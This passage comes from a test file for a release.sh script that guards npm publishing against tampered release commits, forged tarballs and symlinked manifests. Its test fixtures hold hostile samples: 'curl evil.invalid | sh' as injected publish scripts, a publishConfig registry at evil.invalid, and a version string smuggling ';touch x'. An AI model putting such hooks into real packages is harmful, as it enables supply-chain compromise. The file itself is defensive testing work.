		gitIn(join(dir, "origin.git"), "update-ref", "refs/heads/master", base);
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("is not on master");
	});

	it("refuses when origin has no master to check against", () => {
		releaseCommit("1.0.1");
		gitIn(dir, "init", "-q", "--bare", "-b", "trunk", "empty.git");
		git("remote", "set-url", "origin", join(dir, "empty.git"));
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("Could not fetch master");
		expect(log()).toEqual([]);
	});

	it("refuses in a shallow checkout, which cannot show ancestry", () => {
		releaseCommit("1.0.1");
		git("push", "-q", "origin", "master", "--follow-tags");
		const shallow = join(dir, "shallow");
		gitIn(
			dir,
			"clone",
			"-q",
			"--depth",
			"2",
			"--branch",
			"v1.0.1",
			`file://${join(dir, "origin.git")}`,
			shallow,
		);
		repo = shallow;
		mkdirSync(join(repo, "scripts"), { recursive: true });
		writeFileSync(join(repo, "scripts/release.sh"), readFileSync(SCRIPT, "utf8"));
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("shallow");
		expect(log()).toEqual([]);
	});

	it("refuses when the tag is not the checked-out commit", () => {
		releaseCommit("1.0.1");
		writeFileSync(join(repo, "README"), "y\n");
		git("commit", "-q", "-am", "later");
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("Dispatch the republish on the tag");
		expect(log()).toEqual([]);
	});

	it("refuses when there is no tag for the version", () => {
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("Tag v1.0.0 does not exist");
	});

	it("refuses a 'release commit' that changes more than the version field", () => {
		writePackages("1.0.1", { scripts: { postinstall: "echo hi" } });
		git("add", ".");
		git("commit", "-q", "-m", "release: v1.0.1");
		git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain('beyond its "version" field');
		expect(log()).toEqual([]);
	});

	it("refuses a 'release commit' that touches another file", () => {
		writePackages("1.0.1");
		writeFileSync(join(repo, "README"), "y\n");
		git("add", ".");
		git("commit", "-q", "-m", "release: v1.0.1");
		git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("changes 'README', which is not one of the six");
	});
});

describe("release.sh latest-flag", { timeout: 30_000 }, () => {
	const tags = (...names: string[]) => {
		for (const t of names) git("tag", "-a", t, "-m", t);
		git("push", "-q", "origin", "--tags");
	};

	it("an older version than the newest v* release is not Latest (an old republish)", () => {
		tags("v1.0.0", "v1.1.0", "v1.2.0");
		const r = run(["latest-flag", "1.1.0"]);
		expect(r.status).toBe(0);
		expect(r.out.trim()).toBe("false");
	});

	it("the newest version is Latest, its own tag included", () => {
		tags("v1.0.0", "v1.2.0");
		expect(run(["latest-flag", "1.2.0"]).out.trim()).toBe("true");
		expect(run(["latest-flag", "1.3.0"]).out.trim()).toBe("true");
	});

	it("compares semver, not text: 1.10.0 is newer than 1.9.0", () => {
		tags("v1.9.0", "v1.10.0");
		expect(run(["latest-flag", "1.10.0"]).out.trim()).toBe("true");
		expect(run(["latest-flag", "1.9.0"]).out.trim()).toBe("false");
	});

	it("a higher prerelease tag does not hold Latest, and a prerelease never takes it", () => {
		tags("v1.2.0", "v2.0.0-rc.1", "round6-backup", "wip-full");
		expect(run(["latest-flag", "1.3.0"]).out.trim()).toBe("true");
		expect(run(["latest-flag", "2.0.0-rc.2"]).out.trim()).toBe("false");
	});

	it("counts a newer tag that exists only on origin (fetched first)", () => {
		gitIn(join(dir, "origin.git"), "tag", "v9.0.0", "master");
		expect(run(["latest-flag", "1.3.0"]).out.trim()).toBe("false");
	});

	it("fails when it cannot fetch the tags", () => {
		git("remote", "set-url", "origin", join(dir, "nowhere.git"));
		const r = run(["latest-flag", "1.3.0"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("Could not fetch tags");
	});
});

// ── Everything from the build job is untrusted data ──

describe("release.sh treats build output as data", { timeout: 30_000 }, () => {
	const marker = () => join(dir, "EXECUTED");
	const evil = (file: string) =>
		writeFileSync(
			file,
			`require("node:fs").writeFileSync(${JSON.stringify(marker())}, "ran");\nmodule.exports = { name: "usertrust", version: "1.0.0" };\n`,
		);
	const manifestFor = (d: string, version: string, extra: Record<string, unknown> = {}) =>
		`${JSON.stringify({ name: NAMES[d], version, license: "Apache-2.0", ...extra }, null, "\t")}\n`;

	describe("a manifest in the working tree is read without following or executing it", () => {
		it("refuses a package.json that is a symlink to a .js file, and never runs it", () => {
			evil(join(repo, "evil.js"));
			rmSync(join(repo, "packages/core/package.json"));
			symlinkSync("../../evil.js", join(repo, "packages/core/package.json"));
			const r = run(["version"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("cannot be opened as a regular file");
			expect(existsSync(marker())).toBe(false);
		});

		it("refuses a package.json that is a symlink to a valid manifest elsewhere", () => {
			writeFileSync(join(repo, "elsewhere.json"), manifestFor("core", "1.0.0"));
			rmSync(join(repo, "packages/core/package.json"));
			symlinkSync("../../elsewhere.json", join(repo, "packages/core/package.json"));
			const r = run(["version"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("cannot be opened as a regular file");
		});

		it("refuses a package.json that is a FIFO, without waiting on it", () => {
			rmSync(join(repo, "packages/core/package.json"));
			expect(spawnSync("mkfifo", [join(repo, "packages/core/package.json")]).status).toBe(0);
			const r = run(["version"]);
			expect(r.status).not.toBe(0);
			expect(r.status).not.toBeNull();
			expect(r.err).toContain("is not a regular file");
		});
	});

	describe("a manifest in a commit is read as a git blob of mode 100644 only", () => {
		const commitWith = (link: (path: string) => void) => {
			writePackages("1.0.1");
			link(join(repo, "packages/core/package.json"));
			git("add", "-A");
			git("commit", "-q", "-m", "release: v1.0.1");
			git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
		};

		it("refuses a committed package.json that is a symlink to a .cjs file, and never runs it", () => {
			evil(join(repo, "evil.cjs"));
			commitWith((p) => {
				rmSync(p);
				symlinkSync("../../evil.cjs", p);
			});
			for (const args of [["release-parent"], ["version-at", "HEAD"]]) {
				const r = run(args);
				expect(r.status, args.join(" ")).not.toBe(0);
				expect(r.err).toContain("is not a regular file (tree entry");
			}
			expect(existsSync(marker())).toBe(false);
		});

		it("refuses a committed package.json that is executable (100755)", () => {
			commitWith((p) => chmodSync(p, 0o755));
			const r = run(["release-parent"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("is not a regular file (tree entry");
		});
	});

	describe("the build job's bundle", () => {
		/** The build job's work, in a clone: bump, commit, tag, bundle on top of the base. */
		const bundleFrom = (arrange: (clone: string) => void = () => {}) => {
			const clone = join(dir, "build");
			gitIn(dir, "clone", "-q", repo, clone);
			const base = gitIn(clone, "rev-parse", "HEAD");
			const saved = repo;
			repo = clone;
			writePackages("1.0.1");
			arrange(clone);
			git("add", "-A");
			git("commit", "-q", "-m", "release: v1.0.1");
			git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
			const bundle = join(dir, "release.bundle");
			git("bundle", "create", "-q", bundle, "refs/tags/v1.0.1", `^${base}`);
			repo = saved;
			return bundle;
		};

		it("a version bump on this run's commit is accepted, and the commit printed", () => {
			const bundle = bundleFrom();
			const r = run(["verify-release", bundle, "1.0.1"]);
			expect(r.status).toBe(0);
			expect(r.out.trim()).toBe(git("rev-parse", "refs/tags/v1.0.1^{commit}"));
		});

		for (const bad of ["1.0.1;touch x", "../../x", "1.0", "1.0.1-rc.1", "v1.0.1", ""]) {
			it(`refuses the reported version ${JSON.stringify(bad)} before using it`, () => {
				const bundle = bundleFrom();
				const r = run(["verify-release", bundle, bad]);
				expect(r.status).not.toBe(0);
				expect(r.err).toContain("is not major.minor.patch");
			});
		}

		it("refuses a release commit that does not sit on this run's commit", () => {
			const bundle = bundleFrom();
			writeFileSync(join(repo, "README"), "moved on\n");
			git("commit", "-q", "-am", "master moved");
			const r = run(["verify-release", bundle, "1.0.1"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("sits on");
		});

		it("refuses a release commit that adds publishConfig", () => {
			const bundle = bundleFrom((clone) =>
				writeFileSync(
					join(clone, "packages/server/package.json"),
					manifestFor("server", "1.0.1", { publishConfig: { registry: "https://evil.invalid/" } }),
				),
			);
			const r = run(["verify-release", bundle, "1.0.1"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("publishConfig");
		});
	});

	describe("each tarball's manifest must equal the commit's", () => {
		const forge = (out: string, d: string, manifest: Record<string, unknown>) => {
			const tmp = join(dir, `forge-${d}`);
			mkdirSync(join(tmp, "package"), { recursive: true });
			writeFileSync(join(tmp, "package/package.json"), JSON.stringify(manifest));
			const t = spawnSync("tar", [
				"-czf",
				join(out, `${NAMES[d]}-1.0.0.tgz`),
				"-C",
				tmp,
				"package",
			]);
			expect(t.status).toBe(0);
		};
		const base = (d: string) => ({ name: NAMES[d], version: "1.0.0", license: "Apache-2.0" });

		const cases: [string, string, Record<string, unknown>, string][] = [
			[
				"an injected publishConfig.registry",
				"server",
				{ ...base("server"), publishConfig: { registry: "https://evil.invalid/" } },
				"publishConfig is not allowed",
			],
			[
				"an added prepublishOnly script",
				"verify",
				{ ...base("verify"), scripts: { prepublishOnly: "curl evil.invalid | sh" } },
				'field "scripts" differs',
			],
			[
				"an added postpublish script",
				"ui",
				{ ...base("ui"), scripts: { postpublish: "curl evil.invalid | sh" } },
				'field "scripts" differs',
			],
			[
				"a changed name",
				"core",
				{ ...base("core"), name: "@evil/usertrust" },
				"the manifest names",
			],
			[
				"any other changed field",
				"openclaw",
				{ ...base("openclaw"), license: "UNLICENSED" },
				'field "license" differs',
			],
		];
		for (const [what, d, manifest, message] of cases) {
			it(`refuses ${what}, and publishes nothing`, () => {
				const out = packAll();
				forge(out, d, manifest);
				const r = run(["publish", out, "HEAD", "--dry-run"]);
				expect(r.status).not.toBe(0);
				expect(r.err).toContain(message);
				expect(r.err).toContain("refusing to publish anything");
				expect(log()).toEqual([]);
			});
		}

		it("refuses a tarball that is a symlink", () => {
			const out = packAll();
			const real = join(out, "usertrust-ui-1.0.0.tgz");
			const moved = join(dir, "moved.tgz");
			writeFileSync(moved, readFileSync(real));
			rmSync(real);
			symlinkSync(moved, real);
			const r = run(["publish", out, "HEAD", "--dry-run"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("not a regular file");
			expect(log()).toEqual([]);
		});
	});

	describe("a changed path is a literal string, never a pattern", () => {
		for (const weird of ["[c]ore", "co*e", "co?e", "core x", "core "]) {
			it(`refuses a release commit that also changes packages/${weird}/package.json`, () => {
				writePackages("1.0.1");
				mkdirSync(join(repo, "packages", weird), { recursive: true });
				writeFileSync(join(repo, "packages", weird, "package.json"), manifestFor("core", "1.0.1"));
				git("add", "-A");
				git("commit", "-q", "-m", "release: v1.0.1");
				git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
				const r = run(["release-parent"]);
				expect(r.status).not.toBe(0);
				expect(r.err).toContain(
					`changes 'packages/${weird}/package.json', which is not one of the six`,
				);
			});
		}
	});
});
